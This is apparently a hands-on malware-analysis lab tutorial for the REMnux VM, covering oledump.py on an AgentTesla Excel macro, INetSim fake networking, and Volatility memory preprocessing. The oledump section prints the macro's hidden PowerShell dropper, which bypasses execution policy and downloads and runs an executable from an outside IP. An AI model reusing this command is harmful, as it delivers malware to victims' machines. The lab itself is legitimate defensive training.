### File Analysis
In this task, we will use `oledump.py` to conduct static analysis on a potentially malicious Excel document. 

`Oledump.py` is a Python tool that analyzes **OLE2** files, commonly called Structured Storage or Compound File Binary Format. **OLE** stands for **Object Linking and Embedding,** a proprietary technology developed by Microsoft. OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.

Let's start!

Using the virtual machine attached to task 2, the **REMnux VM**, navigate to the `/home/ubuntu/Desktop/tasks/agenttesla/` directory. Our target file is named `agenttesla.xlsm`. Run the command `oledump.py agenttesla.xlsm`. See the terminal below.

 Based on OleDump's file analysis, a VBA script might be embedded in the document and found inside `xl/vbaProject.bin`. Therefore, oledump will assign this with an index of A, though this can sometimes differ. The A (index) +Numbers are called **data streams**. 

Now, we should be aware of the data stream with the capital letter **M**. This means there is a **Macro**, and you might want to check out this data stream, `'VBA/ThisWorkbook'`.

So, let's check it out! Let's run the command `oledump.py agenttesla.xlsm -s 4`. This command will run the oledump and look into the actual data stream of interest using the parameter `-s 4`,  wherein the `-s` parameter is short for `-select`  and the number four(`4`) as the data stream of interest is in the 4th place(`A4: M 688 'VBA/ThisWorkbook'`)
```Terminal 
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4
```

We will run an additional parameter `--vbadecompress` in addition to the previous command. When we use this parameter, oledump will automatically decompress any compressed VBA macros it finds into a more readable format, making it easier to analyze the contents of the macros.
```Terminal 
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
```


```Terminal
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```
Let's break it down!

- So, in PowerShell, running the `-WindowStyle` parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, `hidden` means that the PowerShell window **won’t be visible to the user**.
- By default, PowerShell restricts script execution for security reasons. The `-executionpolicy` parameter allows you to override this policy. The `bypass` means that the **execution policy is temporarily ignored**, allowing any script to run without restriction.
- The `Invoke-WebRequest` is commonly used for downloading files from the internet.
    - The `-Uri` Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource `Doc-3737122pdf.exe` from `http://193.203.203.67/rt`/.
    - The `-OutFile` specifies the local file where the downloaded content will be saved.  In this case, the Doc-3737122pdf.exe will be saved to $TempFile.
- The `Start-Process` is used to execute the downloaded file that is stored in `$TempFile` after the web request.

To summarize, when the document `agenttesla.xlsm` is opened, a Macro will run! This Macro contains a VBA script. The script will run and will be running a PowerShell to download a file named `Doc-3737122pdf.exe` from `http://193.203.203.67/rt/`, save it to a variable $TempFile, then execute or start running the file inside this variable, which is a binary or a .exe file (`Doc-3737122pdf.exe`**)**. This is a usual technique used by threat actors to avoid early detection. Pretty nasty, right?!

Kudos to you for figuring it out!

### Fake Network to Aid Analysis
During dynamic analysis, it is essential to observe the behaviour of potentially malicious software—especially its network activities. There are many approaches to this. We can create a whole infrastructure, a virtual environment with different core machines, and more. Alternatively, there is a tool inside our REMnux VM called **INetSim: Internet Services Simulation Suite****!**

We will utilize INetSim's features to simulate a real network in this task.

  

### Virtual Machines

For this task, we will use two (2) machines. The first is our REMnux machine, which is linked to the Machine Access Task. The second VM is the AttackBox. To start the AttackBox, click the blue **Start AttackBox** button at the top of the page. Do note that you can easily switch between boxes by clicking on them. See the highlighted box in the below image.

![This image shows how you can switch between the machines that were loaded. At the bottom of the screenshot, you will notice the names of the machines. Just click on the name of the machine you want to open. Select the other name of the VM should you wish to switch to the other machine](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1729023300409.png)

  

### INetSim

Before we start, we must configure the tool INetSim inside our REMnux VM. Do not worry; this is a simple change of configuration. First, check the IP address assigned to your machine. This can be seen using the command `ifconfig` or simply by checking the IP address after the **ubuntu@** from the terminal. _The IP addresses may vary._

Terminal

```powershell
ubuntu@MACHINE_IP:~$
```

Here, the machine’s IP is `MACHINE_IP`. Take note of this, as we will need it.

Next, we need to change the INetSim configuration by running this command `sudo nano /etc/inetsim/inetsim.conf` and look for the value `#dns_default_ip 0.0.0.0`.  

Terminal

```powershell
ubuntu@MACHINE_IP:~$ sudo nano /etc/inetsim/inetsim.conf
#########################################
# dns_default_ip
#
# Default IP address to return with DNS replies
#
# Syntax: dns_default_ip 
#
# Default: 127.0.0.1
#
#dns_default_ip  0.0.0.0
```

Remove the comment or **#**, then change the value of **dns_default_ip** from `0.0.0.0` to the machine’s IP address you have identified earlier. In our case, this is `MACHINE_IP`. Save the file using `CRTL + O` command, press enter and exit using `CTRL + X`.

Confirm that the changes have been successful by checking the value of `dns_default_ip` using this command `cat /etc/inetsim/inetsim.conf | grep dns_default_ip`. See below.

Terminal

```powershell
ubuntu@MACHINE_IP:~$ cat /etc/inetsim/inetsim.conf | grep dns_default_ip
# dns_default_ip
# Syntax: dns_default_ip 
dns_default_ip	 MACHINE_IP
```

  

Finally, run the command `sudo inetsim` to start the tool.

Terminal

```powershell
ubuntu@MACHINE_IP:~$ sudo inetsim

```

After running the command, ensure you see the sentence "**Simulation running**" at the bottom of the result and ignore **the http_80_tcp—failed!** Our fake network is now running!

Let's move on to our AttackBox!

  

### AttackBox

From this VM, open a browser and go to our REMnux's IP address using the command `https://MACHINE_IP`. This will prompt a Security Risk; ignore it, click **Advance**, then **Accept the Risk and Continue.**

![This image demonstrate the instructions mentioned where in you should click on Advance, then proceed to Accept the Risk and Continue.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1727039504394.png)

Once done, you should be redirected to the INetSim's homepage!

![This image shows the output or the desired result when the tool INetSim is started without any issues](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1727039504431.png)

One usual malware behaviour is downloading another binary or script. We will try to mimic this behaviour by getting another file from INetsim. We can do this via the CLI or browser, but let's use the CLI to make it more realistic. Use this command: `sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate`.

Terminal

```terminal
root@MACHINE_IP:~# sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
--2024-09-22 22:18:49--  https://MACHINE_IP/second_payload.zip

    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u2018MACHINE_IP\u2019.

2024-09-22 22:18:49 (14.5 MB/s) - \u2018second_payload.zip\u2019 saved [258/258]
```

  

You can try downloading another file as well. For example, try downloading **second_payload.ps1** by using the command:`sudo wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate`.

To verify that the files were downloaded, check your root folder. See the sample below.  

![This image shows the result of downloading the files as instructed. You should be able to see similar to what is shown from this image. There should be two files downloaded namely second_payload.zip and second_payload.ps1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1727040681753.png)

All of these are fake files! Try to open the second_payload.ps1. When executed, this will direct you to INetSim's homepage.

What we did here is **mimic a malware's behaviour**, wherein it will try to reach out to a server or URL and then **download a secondary file that may contain another malware**.

  

### Connection Report

Lastly, go back to your REMnux VM and stop INetSim. By default, it will create a report on its captured connections. This is usually saved in **/var/log/inetsim/report/** directory. You should be able to see something like this.

Terminal

```terminal
Report written to '/var/log/inetsim/report/report.2594.txt' (14 lines)
=== INetSim main process stopped (PID 2594) ===
```

  

Read the file using this command `sudo cat /var/log/inetsim/report/report.2594.txt`. This may differ from your machine.

Terminal

```terminal
ubuntu@MACHINE_IP:~$ sudo cat /var/log/inetsim/report/report.2594.txt
=== Report for session '2594' ===

Real start date            : 2024-09-22 21:04:42

2024-09-22 21:18:49  Last simulated date in log file
===
```

These are the logs when the tool was running. We can see the connections made to the URL, the protocol, and the method it's using. We can also see the fake file that was downloaded.


### Memory Investigation: Evidence Preprocessing
One of the most common investigative practices in Digital Forensics is the preprocessing of evidence. This involves running tools and saving the results in text or JSON format. The analyst often relies on tools such as Volatility when dealing with memory images as evidence. This tool is already included in the REMnux VM. Volatility commands are executed to identify and extract specific artefacts from memory images, and the resulting output can be saved to text files for further examination. Similarly, we can run a script involving the tool's different parameters to preprocess the acquired evidence faster.  

  

#### Preprocessing With Volatility

In this task, we will use the Volatility 3 tool version. However, we won’t go deep into the investigation and analysis part of the result—we could write a whole book about it! Instead, we want you to be familiar with and get a feel for how the tool works. Run the command as instructed and wait for the result to show. Each plugin takes 2-3 minutes to show the output.

Here are some of the parameters or plugins we will use. We will focus on Windows plugins.

- windows.pstree.PsTree
- windows.pslist.PsList
- windows.cmdline.CmdLine
- windows.filescan.FileScan
- windows.dlllist.DllList
- windows.malfind.Malfind
- windows.psscan.PsScan

Let’s get started then!

In your RemnuxVM, run `sudo su`, then navigate to **/home/ubuntu/Desktop/tasks/Wcry_memory_image/** directory, and our file would be **wcry.mem**. We will run each plugin after the command `vol3 -f wcry.mem`.

  

#### PsTree

This plugin lists processes in a tree based on their parent process ID.

Terminal

```powershell
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.pstree.PsTree
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

**View Results**

  

#### PsList

This plugin is used to list all currently active processes in the machine.

Terminal

```powershell
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.pslist.PsList
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

**View Results**

  

  

####  CmdLine

This plugin is used to list process command line arguments.

Terminal

```powershell
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.cmdline.CmdLine
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

**View Results**

  

  

#### FileScan

This plugin scans for file objects in a particular Windows memory image. The results have more than 1,400 lines.

Terminal

```powershell
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.filescan.FileScan
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

**View Results**

  

#### DllList

This plugin lists the loaded modules in a particular Windows memory image. Due to a text limitation, this one won't have a View Results icon.

Terminal

```powershell
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.dlllist.DllList
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

  

#### PsScan

This plugin is used to scan for processes present in a particular Windows memory image.

Terminal

```powershell
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.psscan.PsScan
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

**View Results**

  

#### Malfind

This plugin is used to lists process memory ranges that potentially contain injected code. There won't be any View Results icon for this one due to text limitation.

Terminal

```powershell
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.malfind.Malfind
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

  

For more information regarding other plugins, you may check this [link](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html).

Now, you have the plugins running individually and seeing the result. What you will do now is process this in bulk. Remember, one of the investigative practices involves preprocessing evidence and saving the results to text files, right? The question is how?

The answer? Do a loop statement! See the command below.

Terminal

```powershell
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

Let’s break this command down, shall we?

- We created a variable named `$plugin` with values of each volatility plugin
- Then ran vol3 parameters `-q`, which means quiet mode or does not show the progress in the terminal
- And `-f,` which means read from the memory capture.
- The `plugin > wcry.plugin.done;` means run volatility with the plugins and output it to a file with wcry at the beginning of the text, followed by the name of the plugins and with an extension of `.txt`. Repeat until the value of variable $plugin is used.

After running the command, you won't see any output from the terminal; you'll see files within the same directory where you ran the command.

![This image shows the desired output of running the command from the instructions. You should be able to see seven text files generated from running the loop statement](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1727001460357.png)

  

#### Preprocessing With Strings

Next, we will preprocess the memory image with the Linux strings utility. We will extract the **ASCII**, 16-bit **little-endian**, and 16-bit **big-endian** strings. See the command below.

Terminal

```powershell
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings wcry.mem > wcry.strings.ascii.txt
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e l  wcry.mem > wcry.strings.unicode_little_endian.txt
root@MACHINE_IP:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e b  wcry.mem > wcry.strings.unicode_big_endian.txt
```

The strings command extracts printable ASCII text. The `-e l` option tells strings to extract 16-bit little endian strings. The `-e b` option tells strings to extract 16-bit big endian strings. All three string formats can provide useful information about the system under investigation.

You should have the same output below.

![This image shows the desired output when you run the command as per instructions. You should have at least three text files generated from running the command.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1727002235999.png)

Now, this is ready for analysis, but remember, our goal here in this task is to preprocess the evidence so that any analyst who will investigate this can expedite searches and analysis.

### Conclusion
In this room, we had a hands-on introduction to the REMnux VM, where we could use tools like **oledump.py** for file analysis. We also created a fake network using **INetSim** and preprocessed a memory capture using **volatility and strings**. **All of these tools are included just inside the REMNux VM!** Still, we haven't used many of its tools yet, as we could create different rooms for each to learn and become familiar with it.  

On a side note, REMnux Distro mainly focuses on analyses of potentially malicious programs, documents or files, memory, and similar objects.
